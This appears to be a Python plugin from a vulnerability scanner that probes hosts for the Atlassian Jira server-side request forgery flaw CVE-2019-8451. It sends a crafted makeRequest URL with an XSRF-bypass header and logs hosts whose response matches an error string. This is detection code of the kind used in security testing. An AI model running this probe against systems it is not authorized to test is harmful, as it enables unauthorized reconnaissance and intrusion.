import requests


from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#Atlassian Jira 服务端请求伪造漏洞（CVE-2019-8451）
plugin_id=75
default_port_list=web_port_short

def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/plugins/servlet/gadgets/makeRequest?url={}://{}:{}@'.format(scheme, host, port)]
    hits = ['java.lang.IllegalArgumentException: Host name may not be null']

    headers = {'X-Atlassian-Token': 'no-check'}

    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, timeout=25, headers=headers, verify=False)
                for hit in hits:
                    if hit in response.text:
                        output = response.text
                        insert_vuln_db(host, target, output, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False

